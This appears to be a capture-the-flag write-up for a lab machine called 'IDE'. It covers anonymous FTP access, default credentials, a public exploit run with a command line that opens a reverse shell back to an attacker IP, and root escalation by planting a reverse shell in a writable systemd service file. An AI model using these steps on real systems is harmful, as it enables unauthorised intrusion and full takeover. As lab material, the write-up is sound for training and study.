IDE

Target IP: 10.10.175.113

Scanning



There are four TCP ports open on the target machine: two HTTPs, one SSH, and one FTP. I will start enumeration with FTP.

Enumeration

Port 21: FTP

The FTP application allows anonymous login. Using this, I found a clever directory name .... I do not have write permission over this directory. Inside this directory there is a file called -.


The content of the file - are shown above. This text file contains important information such as usernames (john and drac), john using default password, etc. The message above means we can use default password to login as john.


And we are in using john:password.


There is a public verified working exploit for this application version. I will use this exploit to gain a foothold on the machine.

Exploitation


Using the exploit 49705, I gained a foothold on the target machine. The first terminal is the exploit being run with the commands python3 exploit.py http://10.10.175.113:62337/ john password 10.14.55.153 8443 linux. The second terminal is the connector, which helps to make the connection. The last terminal is the remote shell from the target machine.

Privilege Escalation


Inside drac home directory, I found his password Th3dRaCULa1sR3aL. Maybe we can switch user using this new password?


And we are in as drac now using the password above. The exploit shell was not stable, so I used SSH using the details above.


Looks like we have privileges to restart the FTP application.


The file /lib/systemd/system/vsftpd.service is writeable by drac. So we can put the reverse shell script inside this file, and restart it to get a root shell on a different listener port on our local machine.


And the root shell is here!
